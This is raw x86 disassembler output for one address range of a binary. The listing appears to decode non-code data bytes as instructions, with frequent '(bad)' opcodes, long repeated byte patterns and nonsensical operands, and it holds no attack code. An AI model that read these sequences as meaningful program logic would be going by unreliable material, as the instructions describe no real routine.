  410f70:	cld    
  410f71:	std    
  410f72:	cld    
  410f73:	(bad)  
  410f74:	(bad)  
  410f75:	(bad)  
  410f76:	(bad)  
  410f77:	call   edi
  410f79:	enter  0xffb8,0x84
  410f7d:	push   edi
  410f7e:	and    edx,ebx
  410f80:	adc    DWORD PTR [ebx+0x1e],0x3c
  410f87:	add    BYTE PTR [eax],al
  410f89:	add    BYTE PTR [eax],al
  410f8b:	add    BYTE PTR [edi+edx*2+0x7f9e2b24],al
  410f92:	pop    ebx
  410f93:	(bad)  
  410f94:	(bad)  
  410f95:	(bad)  
  410f96:	(bad)  
  410f97:	jmp    DWORD PTR [ebx-0x52009979]
  410f9d:	xchg   edi,eax
  410f9e:	xchg   bh,bh
  410fa0:	mov    edi,0xbfffb2b4
  410fa5:	mov    ah,0xb2
  410fa7:	(bad)  
  410fa8:	mov    edi,0xbfffb2b4
  410fad:	mov    ah,0xb2
  410faf:	(bad)  
  410fb0:	mov    edi,0xbfffb2b4
  410fb5:	mov    ah,0xb2
  410fb7:	(bad)  
  410fb8:	mov    edi,0xbfffb2b4
  410fbd:	mov    ah,0xb2
  410fbf:	(bad)  
  410fc0:	mov    edi,0xbfffb2b4
  410fc5:	mov    ah,0xb2
  410fc7:	(bad)  
  410fc8:	mov    ecx,0xff7f9d
  410fcd:	add    BYTE PTR [eax],al
  410fcf:	add    BYTE PTR [ebp-0x314eda9a],bl
  410fd5:	mov    edi,0xf0eaffab
  410fda:	cmc    
  410fdb:	(bad)  
  410fdc:	fucomi st,st(1)
  410fde:	fdivp  st(7),st
  410fe0:	jbe    0x410fb2
  410fe2:	js     0x410fe3
  410fe4:	and    eax,0xaff29ac
  410fe9:	xchg   ebp,eax
  410fea:	push   cs
  410feb:	call   FWORD PTR [edi+edx*4]
  410fee:	and    bh,bh
  410ff0:	pushf  
  410ff1:	rcr    BYTE PTR [ebp-0x1],1
  410ff7:	(bad)  
  410ff8:	(bad)  
  410ff9:	(bad)  
  410ffa:	(bad)  
  410ffb:	jmp    FWORD PTR [ecx-0x7e009675]
  411001:	push   edx
  411002:	sbb    eax,0x8f
  411007:	add    BYTE PTR [eax],al
  411009:	add    BYTE PTR [eax],al
  41100b:	add    BYTE PTR [edi+edx*2+0x7f9e2b24],al
  411012:	pop    ebx
  411013:	jmp    DWORD PTR [ebx-0x26009979]
  411019:	retf   
  41101a:	mov    ebx,0xb2b4bfff
  41101f:	(bad)  
  411020:	mov    edi,0xbfffb2b4
  411025:	mov    ah,0xb2
  411027:	(bad)  
  411028:	mov    edi,0xbfffb2b4
  41102d:	mov    ah,0xb2
  41102f:	(bad)  
  411030:	mov    edi,0xbfffb2b4
  411035:	mov    ah,0xb2
  411037:	(bad)  
  411038:	mov    edi,0xbfffb2b4
  41103d:	mov    ah,0xb2
  41103f:	(bad)  
  411040:	mov    edi,0xbfffb2b4
  411045:	mov    ah,0xb2
  411047:	(bad)  
  411048:	mov    ecx,0xff7f9d
  41104d:	add    BYTE PTR [eax],al
  41104f:	add    BYTE PTR [eax-0x241ec087],ch
  411055:	fcom   st(1)
  411057:	(bad)  
  411058:	out    dx,al
  411059:	in     al,dx
  41105a:	cmc    
  41105b:	push   DWORD PTR [ecx+0x48ffb5e1]
  411061:	ror    BYTE PTR [ebp-0x1],1
  411064:	cmp    al,al
  411066:	jmp    FWORD PTR ds:[ecx]
  411069:	lods   eax,DWORD PTR ds:[esi]
  41106a:	sub    eax,0x12970fff
  41106f:	push   DWORD PTR [ebx]
  411071:	mov    ds:0xf7efff37,al
  411076:	out    dx,eax
  411077:	(bad)  
  411078:	(bad)  
  411079:	(bad)  
  41107a:	(bad)  
  41107b:	inc    edi
  41107d:	mov    eax,0x618bffa6
  411082:	das    
  411083:	ret    0x0
  411086:	add    BYTE PTR [eax],al
  411088:	add    BYTE PTR [eax],al
  41108a:	add    BYTE PTR [eax],al
  41108c:	test   BYTE PTR [edi+0x24],dl
  41108f:	sub    ebx,DWORD PTR [esi-0x2600a481]
  411095:	retf   
  411096:	mov    ebx,0xefeff1ff
  41109b:	(bad)  
  41109c:	mov    edi,0xbfffb2b4
  4110a1:	mov    ah,0xb2
  4110a3:	(bad)  
  4110a4:	mov    edi,0xbfffb2b4
  4110a9:	mov    ah,0xb2
  4110ab:	(bad)  
  4110ac:	mov    edi,0xbfffb2b4
  4110b1:	mov    ah,0xb2
  4110b3:	(bad)  
  4110b4:	mov    edi,0xbfffb2b4
  4110b9:	mov    ah,0xb2
  4110bb:	(bad)  
  4110bc:	mov    edi,0xbfffb2b4
  4110c1:	mov    ah,0xb2
  4110c3:	(bad)  
  4110c4:	mov    edi,0xb9ffb2b4
  4110c9:	popf   
  4110ca:	jg     0x4110cb
  4110cc:	add    BYTE PTR [eax],al
  4110ce:	add    BYTE PTR [eax],al
  4110d0:	mov    al,0x86
  4110d2:	push   ebx
  4110d3:	lock jecxz 0x4110bd
  4110d6:	call   0xf52bffda
  4110db:	jmp    DWORD PTR [ecx+0x49ffa6df]
  4110e1:	aad    0x4d
  4110e3:	dec    DWORD PTR [ebp-0x2f]
  4110e6:	push   ecx
  4110e7:	(bad)  
  4110e8:	rol    DWORD PTR ds:[edx-0x1],0x28
  4110ed:	stos   DWORD PTR es:[edi],eax
  4110ee:	sub    edi,edi
  4110f0:	and    bl,BYTE PTR [edi-0xd1a00db]
  4110f6:	in     eax,0xff
  4110f8:	(bad)  
  4110f9:	(bad)  
  4110fa:	(bad)  
  4110fb:	call   edi
  4110fd:	rol    edi,1
  4110ff:	call   DWORD PTR [ecx+0xd23b69]
	...
  41110d:	add    BYTE PTR [eax],al
  41110f:	add    BYTE PTR [ecx-0x8063],bh
  411115:	(bad)  
  411116:	(bad)  
  411117:	push   ecx
  411119:	out    dx,eax
  41111a:	out    dx,eax
  41111b:	(bad)  
  41111c:	mov    edi,0xbfffb2b4
  411121:	mov    ah,0xb2
  411123:	(bad)  
  411124:	mov    edi,0xbfffb2b4
  411129:	mov    ah,0xb2
  41112b:	(bad)  
  41112c:	mov    edi,0xbfffb2b4
  411131:	mov    ah,0xb2
  411133:	(bad)  
  411134:	mov    edi,0xbfffb2b4
  411139:	mov    ah,0xb2
  41113b:	(bad)  
  41113c:	mov    edi,0xbfffb2b4
  411141:	mov    ah,0xb2
  411143:	(bad)  
  411144:	mov    edi,0xb9ffb2b4
  411149:	popf   
  41114a:	jg     0x41114b
  41114c:	add    BYTE PTR [eax],al
  41114e:	add    BYTE PTR [eax],al
  411150:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411151:	je     0x411189
  411153:	into   
  411154:	fcom   st(2)
  411156:	(bad)  
  411159:	in     eax,dx
  41115a:	cmc    
  41115b:	inc    eax
  41115d:	jecxz  0x411123
  41115f:	call   FWORD PTR [ecx-0x2a]
  411162:	pop    ebp
  411163:	dec    DWORD PTR [ebx-0x2b]
  411166:	dec    edi
  411167:	dec    DWORD PTR [edx+edx*8+0x50]
  41116b:	push   DWORD PTR ds:0x66ff39bf
  411171:	ret    
  411172:	imul   edi,edi,0xfff2f4f0
  411178:	(bad)  
  411179:	(bad)  
  41117a:	(bad)  
  41117b:	(bad)  
  41117c:	mov    esp,0x8aff8ba6
  411181:	pop    esp
  411182:	daa    
  411183:	scas   eax,DWORD PTR es:[edi]
	...
  411190:	mov    ecx,0xffff7f9d
  411195:	(bad)  
  411196:	(bad)  
  411197:	push   ecx
  411199:	out    dx,eax
  41119a:	out    dx,eax
  41119b:	(bad)  
  41119c:	mov    edi,0xbfffb2b4
  4111a1:	mov    ah,0xb2
  4111a3:	(bad)  
  4111a4:	mov    edi,0xbfffb2b4
  4111a9:	mov    ah,0xb2
  4111ab:	(bad)  
  4111ac:	mov    edi,0xbfffb2b4
  4111b1:	mov    ah,0xb2
  4111b3:	(bad)  
  4111b4:	mov    edi,0xbfffb2b4
  4111b9:	mov    ah,0xb2
  4111bb:	(bad)  
  4111bc:	mov    edi,0xbfffb2b4
  4111c1:	mov    ah,0xb2
  4111c3:	(bad)  
  4111c4:	mov    edi,0xb9ffb2b4
  4111c9:	popf   
  4111ca:	jg     0x4111cb
  4111cc:	add    BYTE PTR [eax],al
  4111ce:	add    BYTE PTR [eax],al
  4111d0:	mov    eax,ds:0xc5961f66
  4111d5:	lods   al,BYTE PTR ds:[esi]
  4111d6:	mov    edi,?
  4111d8:	call   0xe34104cb
  4111dd:	out    0xe6,eax
  4111df:	jmp    DWORD PTR [edi+0x67ffabe0]
  4111e5:	fsubr  DWORD PTR [ebx-0x1]
  4111e8:	push   edi
  4111e9:	(bad)  
  4111ea:	pop    esp
  4111eb:	(bad)  
  4111ec:	jp     0x4111c6
  4111ee:	jge    0x4111ef
  4111f0:	retf   0xcce5
  4111f3:	(bad)  
  4111f4:	clc    
  4111f5:	clc    
  4111f6:	std    
  4111f7:	push   edx
  4111f9:	icebp  
  4111fa:	out    dx,eax
  4111fb:	jmp    DWORD PTR [eax-0x7704b386]
  411201:	push   ebp
  411202:	sbb    esi,DWORD PTR [ebx+0x0]
	...
  41120d:	add    BYTE PTR [eax],al
  41120f:	add    BYTE PTR [ecx-0x8063],bh
  411215:	(bad)  
  411216:	(bad)  
  411217:	push   ecx
  411219:	out    dx,eax
  41121a:	out    dx,eax
  41121b:	(bad)  
  41121c:	mov    edi,0xbfffb2b4
  411221:	mov    ah,0xb2
  411223:	(bad)  
  411224:	mov    edi,0xbfffb2b4
  411229:	mov    ah,0xb2
  41122b:	(bad)  
  41122c:	mov    edi,0xbfffb2b4
  411231:	mov    ah,0xb2
  411233:	(bad)  
  411234:	mov    edi,0xbfffb2b4
  411239:	mov    ah,0xb2
  41123b:	(bad)  
  41123c:	mov    edi,0xbfffb2b4
  411241:	mov    ah,0xb2
  411243:	(bad)  
  411244:	mov    edi,0xb9ffb2b4
  411249:	popf   
  41124a:	jg     0x41124b
  41124c:	add    BYTE PTR [eax],al
  41124e:	add    BYTE PTR [eax],al
  411250:	mov    eax,ds:0xa2322268
  411255:	imul   esp,DWORD PTR ds:0xb5c7d2e7,0xf7f0eaff
  41125f:	jmp    ebp
  411261:	call   0xe71c124f
  411266:	fdivp  st(7),st
  411268:	aad    0xe5
  41126a:	fcos   
  41126c:	loopne 0x411255
  41126e:	in     al,0xff
  411270:	in     al,dx
  411271:	out    dx,eax
  411272:	repnz push edx
  411275:	idiv   edx
  411277:	(bad)  
  411278:	mov    eax,0x8aff7699
  41127d:	push   ebp
  41127e:	sbb    BYTE PTR [edi+0x1a225c8d],ah
	...
  411290:	mov    ecx,0xffff7f9d
  411295:	(bad)  
  411296:	(bad)  
  411297:	push   ecx
  411299:	out    dx,eax
  41129a:	out    dx,eax
  41129b:	(bad)  
  41129c:	mov    edi,0xbfffb2b4
  4112a1:	mov    ah,0xb2
  4112a3:	(bad)  
  4112a4:	mov    edi,0xbfffb2b4
  4112a9:	mov    ah,0xb2
  4112ab:	(bad)  
  4112ac:	mov    edi,0xbfffb2b4
  4112b1:	mov    ah,0xb2
  4112b3:	(bad)  
  4112b4:	mov    edi,0xbfffb2b4
  4112b9:	mov    ah,0xb2
  4112bb:	(bad)  
  4112bc:	mov    edi,0xbfffb2b4
  4112c1:	mov    ah,0xb2
  4112c3:	(bad)  
  4112c4:	mov    edi,0xb9ffb2b4
  4112c9:	popf   
  4112ca:	jg     0x4112cb
  4112cc:	add    BYTE PTR [eax],al
  4112ce:	add    BYTE PTR [eax],al
  4112d0:	mov    ds:0xa0012469,al
  4112d5:	gs push ds
  4112d7:	push   0xffffffa3
  4112d9:	imul   ebp,DWORD PTR [eax],0xfffffff3
  4112dc:	iret   
  4112dd:	mov    edi,0xece6ffaa
  4112e2:	out    dx,eax
  4112e3:	(bad)  
  4112e4:	call   0xe94104d6
  4112e9:	jmp    0x4112da
  4112eb:	(bad)  
  4112ec:	call   0xe34105df
  4112f1:	jecxz  0x4112d4
  4112f3:	(bad)  
  4112f4:	mov    eax,0x8fff7399
  4112f9:	pop    eax
  4112fa:	push   ss
  4112fb:	int3   
  4112fc:	xchg   ecx,eax
  4112fd:	pop    edi
  4112fe:	and    al,0x28
	...
  411310:	mov    ecx,0xffff7f9d
  411315:	(bad)  
  411316:	(bad)  
  411317:	push   ecx
  411319:	out    dx,eax
  41131a:	out    dx,eax
  41131b:	push   ecx
  41131d:	out    dx,eax
  41131e:	out    dx,eax
  41131f:	push   ecx
  411321:	out    dx,eax
  411322:	out    dx,eax
  411323:	push   ecx
  411325:	out    dx,eax
  411326:	out    dx,eax
  411327:	push   ecx
  411329:	out    dx,eax
  41132a:	out    dx,eax
  41132b:	push   ecx
  41132d:	out    dx,eax
  41132e:	out    dx,eax
  41132f:	push   ecx
  411331:	out    dx,eax
  411332:	out    dx,eax
  411333:	push   ecx
  411335:	out    dx,eax
  411336:	out    dx,eax
  411337:	push   ecx
  411339:	out    dx,eax
  41133a:	out    dx,eax
  41133b:	push   ecx
  41133d:	out    dx,eax
  41133e:	out    dx,eax
  41133f:	push   ecx
  411341:	out    dx,eax
  411342:	out    dx,eax
  411343:	push   ecx
  411345:	out    dx,eax
  411346:	out    dx,eax
  411347:	(bad)  
  411348:	mov    ecx,0xff7f9d
  41134d:	add    BYTE PTR [eax],al
  41134f:	add    BYTE PTR [eax],al
  411351:	add    BYTE PTR [eax],al
  411353:	add    BYTE PTR [edx-0x5ffeda97],ah
  411359:	popw   ds
  41135b:	pop    eax
  41135c:	mov    ds:0xb4d22469,al
  411361:	mov    WORD PTR [ecx-0x2],ds
  411364:	retf   0x9cb7
  411367:	call   esp
  411369:	retf   
  41136a:	mov    esp,0x789ebbff
  41136f:	jmp    DWORD PTR [edi-0x6a09bc86]
  411375:	pop    ebp
  411376:	sbb    ah,BYTE PTR [edi+0x29246296]
	...
  411390:	mov    ecx,0xffff7f9d
  411395:	(bad)  
  411396:	(bad)  
  411397:	(bad)  
  411398:	(bad)  
  411399:	(bad)  
  41139a:	(bad)  
  41139b:	(bad)  
  41139c:	(bad)  
  41139d:	(bad)  
  41139e:	(bad)  
  41139f:	(bad)  
  4113a0:	(bad)  
  4113a1:	(bad)  
  4113a2:	(bad)  
  4113a3:	(bad)  
  4113a4:	(bad)  
  4113a5:	(bad)  
  4113a6:	(bad)  
  4113a7:	(bad)  
  4113a8:	(bad)  
  4113a9:	(bad)  
  4113aa:	(bad)  
  4113ab:	(bad)  
  4113ac:	(bad)  
  4113ad:	(bad)  
  4113ae:	(bad)  
  4113af:	(bad)  
  4113b0:	(bad)  
  4113b1:	(bad)  
  4113b2:	(bad)  
  4113b3:	(bad)  
  4113b4:	(bad)  
  4113b5:	(bad)  
  4113b6:	(bad)  
  4113b7:	(bad)  
  4113b8:	(bad)  
  4113b9:	(bad)  
  4113ba:	(bad)  
  4113bb:	(bad)  
  4113bc:	(bad)  
  4113bd:	(bad)  
  4113be:	(bad)  
  4113bf:	(bad)  
  4113c0:	(bad)  
  4113c1:	(bad)  
  4113c2:	(bad)  
  4113c3:	(bad)  
  4113c4:	(bad)  
  4113c5:	(bad)  
  4113c6:	(bad)  
  4113c7:	(bad)  
  4113c8:	mov    ecx,0xff7f9d
	...
  4113d5:	add    BYTE PTR [eax],al
  4113d7:	add    BYTE PTR [edx-0x5ffeda96],ah
  4113dd:	gs pop ds
  4113df:	cmp    eax,0x8e1c649f
  4113e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113e5:	jno    0x411417
  4113e7:	ret    0x76a8
  4113ea:	cmp    dl,bl
  4113ec:	lahf   
  4113ed:	addr16 and al,0xaf
  4113f0:	cdq    
  4113f1:	pop    esi
  4113f2:	sbb    dh,BYTE PTR [edx-0x66]
  4113f5:	and    ebx,DWORD PTR fs:[ebx]
	...
  411410:	mov    ecx,0xb9ff7f9d
  411415:	popf   
  411416:	jg     0x411417
  411418:	mov    ecx,0xb9ff7f9d
  41141d:	popf   
  41141e:	jg     0x41141f
  411420:	mov    ecx,0xb9ff7f9d
  411425:	popf   
  411426:	jg     0x411427
  411428:	mov    ecx,0xb9ff7f9d
  41142d:	popf   
  41142e:	jg     0x41142f
  411430:	mov    ecx,0xb9ff7f9d
  411435:	popf   
  411436:	jg     0x411437
  411438:	mov    ecx,0xb9ff7f9d
  41143d:	popf   
  41143e:	jg     0x41143f
  411440:	mov    ecx,0xb9ff7f9d
  411445:	popf   
  411446:	jg     0x411447
  411448:	mov    ecx,0xff7f9d
	...
  4114cd:	add    BYTE PTR [eax],al
  4114cf:	add    bh,bh
  4114d1:	(bad)  
  4114d2:	(bad)  
  4114d3:	(bad)  
  4114d4:	(bad)  
  4114d5:	(bad)  
  4114d6:	dec    DWORD PTR [edi]
  4114d8:	sar    BYTE PTR [edi],0xfe
  4114db:	jo     0x511300
  4114e1:	(bad)  
  4114e3:	sldt   WORD PTR [esi]
  4114e6:	cmp    al,0xf
  4114e8:	add    BYTE PTR [esi],al
  4114ea:	sbb    BYTE PTR [edi],bl
  4114ec:	add    BYTE PTR [esi],al
  4114ee:	or     BYTE PTR [edi],bl
  4114f0:	add    BYTE PTR [esi],al
  4114f2:	add    BYTE PTR [edi],bh
  4114f4:	add    BYTE PTR [esi],al
  4114f6:	add    BYTE PTR [ebx],al
  4114f8:	add    BYTE PTR [esi],al
  4114fa:	add    BYTE PTR [ecx],al
  4114fc:	add    BYTE PTR [esi],al
  4114fe:	add    BYTE PTR [ebx],al
  411500:	add    BYTE PTR [esi],cl
  411502:	add    BYTE PTR [edi],al
  411504:	sbb    BYTE PTR [esi],0x0
  411507:	xadd   BYTE PTR [esi],bh
  41150a:	add    BYTE PTR [edi],bl
  41150c:	(bad)  
  41150d:	inc    BYTE PTR [eax]
  41150f:	aas    
  411510:	(bad)  
  411511:	inc    BYTE PTR [eax]
  411513:	jg     0x411514
  411515:	inc    BYTE PTR [eax]
  411517:	inc    eax
  411519:	add    BYTE PTR ds:[ecx],al
  41151c:	sbb    BYTE PTR [esi],0x0
  41151f:	add    DWORD PTR [eax],eax
  411521:	push   cs
  411522:	add    BYTE PTR [ecx],al
  411524:	add    BYTE PTR [esi],al
  411526:	add    BYTE PTR [ecx],al
  411528:	add    BYTE PTR [esi],al
  41152a:	add    BYTE PTR [ecx],al
  41152c:	add    BYTE PTR [esi],al
  41152e:	add    BYTE PTR [ecx],al
  411530:	add    BYTE PTR [edi],al
  411532:	add    BYTE PTR [ecx],al
  411534:	add    BYTE PTR [edi],al
  411536:	add    BYTE PTR [ecx],al
  411538:	add    BYTE PTR [edi],al
  41153a:	add    BYTE PTR [ecx],al
  41153c:	add    BYTE PTR [edi],al
  41153e:	add    BYTE PTR [ecx],al
  411540:	add    BYTE PTR [edi],cl
  411542:	add    BYTE PTR [ecx],al
  411544:	sbb    BYTE PTR [edi],0x0
  411547:	add    eax,eax
  411549:	aas    
  41154a:	add    BYTE PTR [ecx],al
  41154c:	(bad)  
  41154d:	(bad)  
  41154e:	(bad)  
  41154f:	jmp    FWORD PTR [eax]
  411551:	add    BYTE PTR [eax],al
  411553:	add    BYTE PTR [eax],bl
  411555:	add    BYTE PTR [eax],al
  411557:	add    BYTE PTR [eax],dh
  411559:	add    BYTE PTR [eax],al
  41155b:	add    BYTE PTR [ecx],al
  41155d:	add    BYTE PTR [eax],ah
  41155f:	add    BYTE PTR [eax],al
  411561:	add    BYTE PTR [eax],al
  411563:	add    BYTE PTR [eax+0x9],ah
	...
  41157e:	add    BYTE PTR [eax],al
  411580:	lahf   
  411581:	arpl   WORD PTR [ebx],bx
  411583:	xor    bl,BYTE PTR [edi-0x5368e49d]
  411589:	jl     0x4115cd
  41158b:	into   
  41158c:	stos   DWORD PTR es:[edi],eax
  41158d:	jl     0x4115d3
  41158f:	rcr    BYTE PTR [edx-0x6960e4a0],cl
  411595:	pop    ebp
  411596:	sbb    bh,BYTE PTR [ebx]
	...
  4115dc:	xchg   ecx,eax
  4115dd:	pop    esp
  4115de:	sbb    eax,0x205c8e27
  4115e3:	scas   al,BYTE PTR es:[edi]
  4115e4:	mov    ah,0x98
  4115e6:	jbe    0x4115d7
  4115e8:	rol    dh,cl
  4115ea:	mov    bh,0xff
  4115ec:	rol    bh,cl
  4115ee:	mov    eax,0x7e9cb7ff
  4115f3:	repz test DWORD PTR [edi+0x25],edx
  4115f7:	mov    dh,0x7f
  4115f9:	push   eax
  4115fa:	sbb    esi,DWORD PTR [eax+eax*1]
	...
  411621:	add    BYTE PTR [eax],al
  411623:	add    BYTE PTR [esi-0x79d6d8a7],al
  411629:	pop    ecx
  41162a:	daa    
  41162b:	sub    DWORD PTR [esi+0x292759],eax
  411631:	add    BYTE PTR [eax],al
  411633:	add    BYTE PTR [eax],al
  411635:	add    BYTE PTR [eax],al
  411637:	add    BYTE PTR [edi-0x6be6e1a0],dl
  41163d:	pop    edi
  41163e:	and    ah,al
  411640:	int    0xbc
  411642:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411643:	(bad)  
  411644:	(bad)  
  411645:	std    
  411646:	std    
  411647:	(bad)  
  411648:	(bad)  
  411649:	(bad)  
  41164a:	(bad)  
  41164b:	(bad)  
  41164c:	(bad)  
  41164d:	(bad)  
  41164e:	(bad)  
  41164f:	(bad)  
  411650:	(bad)  
  411651:	(bad)  
  411652:	(bad)  
  411653:	jmp    edi
  411655:	(bad)  
  411657:	inc    DWORD PTR [edi-0x7f29d6a5]
  41165d:	push   ecx
  41165e:	sbb    al,0x2a
	...
  411680:	xchg   BYTE PTR [ecx+0x27],bl
  411683:	dec    ebx
  411684:	test   BYTE PTR [edi+0x24],dl
  411687:	inc    DWORD PTR [edi+edx*2+0x5784ff24]
  41168e:	and    al,0xff
  411690:	xchg   BYTE PTR [ecx+0x27],bl
  411693:	sub    DWORD PTR [eax],eax
  411695:	add    BYTE PTR [eax],al
  411697:	add    BYTE PTR [eax-0x3c7fe19f],bl
  41169d:	scas   al,BYTE PTR es:[edi]
  41169e:	xchg   ecx,eax
  41169f:	push   esi
  4116a1:	cli    
  4116a2:	(bad)  
  4116a3:	(bad)  
  4116a4:	cli    
  4116a5:	cld    
  4116a6:	(bad)  
  4116a7:	(bad)  
  4116a8:	std    
  4116a9:	(bad)  
  4116aa:	(bad)  
  4116ab:	(bad)  
  4116ac:	(bad)  
  4116ad:	(bad)  
  4116ae:	(bad)  
  4116af:	(bad)  
  4116b0:	(bad)  
  4116b1:	(bad)  
  4116b2:	(bad)  
  4116b3:	(bad)  
  4116b4:	(bad)  
  4116b5:	(bad)  
  4116b6:	(bad)  
  4116b7:	jmp    esp
  4116b9:	fcmovbe st,st(0)
  4116bb:	inc    DWORD PTR [ecx+0xad1d52]
	...
  4116c9:	add    BYTE PTR [eax],al
  4116cb:	add    BYTE PTR [esi+0x292759],al
	...
  4116d9:	add    BYTE PTR [eax],al
  4116db:	add    BYTE PTR [esi-0x7bd6d8a7],al
  4116e1:	push   edi
  4116e2:	and    al,0xff
  4116e4:	not    eax
  4116e6:	mov    ecx,0xb9d0f7ff
  4116eb:	inc    DWORD PTR [edi+edx*2+0x5986ff24]
  4116f2:	daa    
  4116f3:	sub    DWORD PTR [eax],eax
  4116f5:	add    BYTE PTR [eax],al
  4116f7:	add    BYTE PTR [eax-0x192fbc85],ch
  4116fd:	loop   0x4116e2
  4116ff:	push   esi
  411701:	stc    
  411702:	(bad)  
  411703:	push   edi
  411705:	cli    
  411706:	(bad)  
  411707:	(bad)  
  411708:	sti    
  411709:	cld    
  41170a:	(bad)  
  41170b:	(bad)  
  41170c:	std    
  41170d:	std    
  41170e:	(bad)  
  41170f:	(bad)  
  411710:	(bad)  
  411711:	(bad)  
  411712:	(bad)  
  411713:	(bad)  
  411714:	(bad)  
  411715:	(bad)  
  411716:	(bad)  
  411717:	(bad)  
  411718:	(bad)  
  411719:	(bad)  
  41171a:	(bad)  
  41171b:	jmp    DWORD PTR [eax+0xf35a80]
  411721:	add    BYTE PTR [eax],al
  411723:	add    BYTE PTR [eax],al
  411725:	add    BYTE PTR [eax],al
  411727:	add    BYTE PTR [esi-0x76d6d8a7],al
  41172d:	pop    edi
  41172e:	xor    bh,bh
  411730:	xchg   BYTE PTR [ecx+0x27],bl
  411733:	dec    ebx
	...
  41173c:	xchg   BYTE PTR [ecx+0x27],bl
  41173f:	dec    ebx
  411740:	test   BYTE PTR [edi+0x24],dl
  411743:	push   edi
  411745:	sar    BYTE PTR [ecx+0x245784ff],1
  41174b:	inc    DWORD PTR [esi+0x4b2759]
  411751:	add    BYTE PTR [eax],al
  411753:	add    BYTE PTR [eax],al
  411755:	add    BYTE PTR [eax],al
  411757:	add    BYTE PTR [edi-0xd0f976c],dh
  41175d:	out    dx,eax
  41175e:	std    
  41175f:	push   edx
  411761:	idiv   bh
  411763:	push   ebx
  411765:	clc    
  411766:	(bad)  
  411767:	push   edi
  411769:	cli    
  41176a:	(bad)  
  41176b:	(bad)  
  41176c:	sti    
  41176d:	cld    
  41176e:	(bad)  
  41176f:	(bad)  
  411770:	std    
  411771:	(bad)  
  411772:	(bad)  
  411773:	(bad)  
  411774:	(bad)  
  411775:	(bad)  
  411776:	(bad)  
  411777:	(bad)  
  411778:	(bad)  
  411779:	(bad)  
  41177a:	(bad)  
  41177b:	(bad)  
  41177c:	mov    ebx,0xff90a8
  411781:	add    BYTE PTR [eax],al
  411783:	add    BYTE PTR [eax],al
  411785:	add    BYTE PTR [eax],al
  411787:	add    BYTE PTR [esi-0x74d6d8a7],al
  41178d:	bound  esi,QWORD PTR [ebx]
  41178f:	dec    DWORD PTR [ecx-0x7900d0a1]
  411795:	pop    ecx
  411796:	daa    
  411797:	dec    ebx
  411798:	add    BYTE PTR [eax],al
  41179a:	add    BYTE PTR [eax],al
  41179c:	test   BYTE PTR [eax+0x25],bl
  41179f:	push   edi
  4117a1:	sar    BYTE PTR [ecx-0x462f0801],1
  4117a7:	inc    DWORD PTR [edi+edx*2+0x5986ff24]
  4117ae:	daa    
  4117af:	sub    DWORD PTR [eax],eax
  4117b1:	add    BYTE PTR [eax],al
  4117b3:	add    BYTE PTR [eax],al
  4117b5:	add    BYTE PTR [eax],al
  4117b7:	add    BYTE PTR [eax-0x1525ad7a],dh
  4117bd:	call   0xf83517af
  4117c2:	(bad)  
  4117c3:	push   ecx
  4117c5:	idiv   bh
  4117c7:	push   esp
  4117c9:	clc    
  4117ca:	(bad)  
  4117cb:	push   edi
  4117cd:	cli    
  4117ce:	(bad)  
  4117cf:	(bad)  
  4117d0:	cli    
  4117d1:	cld    
  4117d2:	(bad)  
  4117d3:	(bad)  
  4117d4:	std    
  4117d5:	(bad)  
  4117d6:	(bad)  
  4117d7:	(bad)  
  4117d8:	(bad)  
  4117d9:	(bad)  
  4117da:	(bad)  
  4117db:	jmp    FWORD PTR [ebx+0xf76b8d]
  4117e1:	add    BYTE PTR [eax],al
  4117e3:	add    BYTE PTR [eax],al
  4117e5:	add    BYTE PTR [eax],al
  4117e7:	add    BYTE PTR [esi-0x72d6d8a7],al
  4117ed:	gs cmp bh,bh
  4117f0:	clc    
  4117f1:	(bad)  
  4117f2:	ret    0x89ff
  4117f5:	pop    edi
  4117f6:	inc    DWORD PTR cs:[esi-0x79b4d8a7]
  4117fd:	pop    ecx
  4117fe:	daa    
  4117ff:	push   edi
  411801:	sar    BYTE PTR [ecx+0x245784ff],1
  411807:	inc    DWORD PTR [esi+0x4b2759]
	...
  411815:	add    BYTE PTR [eax],al
  411817:	add    BYTE PTR [ebx+ebp*2-0x3c2f63d9],ah
  41181e:	scas   eax,DWORD PTR es:[edi]
  41181f:	(bad)  
  411820:	out    dx,al
  411821:	hlt    
  411822:	(bad)  
  411823:	(bad)  
  411824:	out    dx,eax
  411825:	cmc    
  411826:	(bad)  
  411827:	push   ecx
  411829:	idiv   edi
  41182b:	push   esp
  41182d:	clc    
  41182e:	(bad)  
  41182f:	push   edi
  411831:	cli    
  411832:	(bad)  
  411833:	(bad)  
  411834:	sti    
  411835:	cld    
  411836:	(bad)  
  411837:	(bad)  
  411838:	in     al,dx
  411839:	out    0xe1,eax
  41183b:	call   DWORD PTR [eax+0xcb2b62]
  411841:	add    BYTE PTR [eax],al
  411843:	add    BYTE PTR [eax],al
  411845:	add    BYTE PTR [eax],al
  411847:	add    BYTE PTR [esi-0x70d6d8a7],al
  41184d:	push   0xdefaff3c
  411852:	into   
  411853:	(bad)  
  411854:	clc    
  411855:	aad    0xc1
  411857:	dec    DWORD PTR [eax-0x800d1a1]
  41185d:	sar    BYTE PTR [ecx-0x462f0801],1
  411863:	inc    DWORD PTR [ebp-0x7900daa9]
  411869:	pop    ecx
  41186a:	daa    
  41186b:	sub    DWORD PTR [eax],eax
	...
  411875:	add    BYTE PTR [eax],al
  411877:	add    BYTE PTR [edi-0x58d0e49d],bl
  41187d:	je     0x4118b4
  41187f:	call   0x7ea5d
  411884:	out    dx,eax
  411885:	cmc    
  411886:	(bad)  
  411887:	(bad)  
  411888:	in     eax,dx
  411889:	repz cld 
  41188b:	push   ecx
  41188d:	idiv   bh
  41188f:	push   ebx
  411891:	clc    
  411892:	(bad)  
  411893:	(bad)  
  411894:	jmp    0x41187f
  411896:	out    0xff,eax
  411898:	mov    eax,ds:0x8aef4376
  41189d:	push   esi
  41189e:	sbb    al,BYTE PTR [edi+0x0]
  4118a1:	add    BYTE PTR [eax],al
  4118a3:	add    BYTE PTR [eax],al
  4118a5:	add    BYTE PTR [eax],al
  4118a7:	add    BYTE PTR [esi-0x6ed6d8a7],al
  4118ad:	imul   eax,DWORD PTR [eax-0x1],0xfffffffb
  4118b1:	call   0xdf3b1892
  4118b6:	into   
  4118b7:	(bad)  
  4118b8:	clc    
  4118b9:	(bad)  
  4118ba:	sar    edi,0xf7
  4118bd:	sar    BYTE PTR [ecx+0x2a5b86ff],1
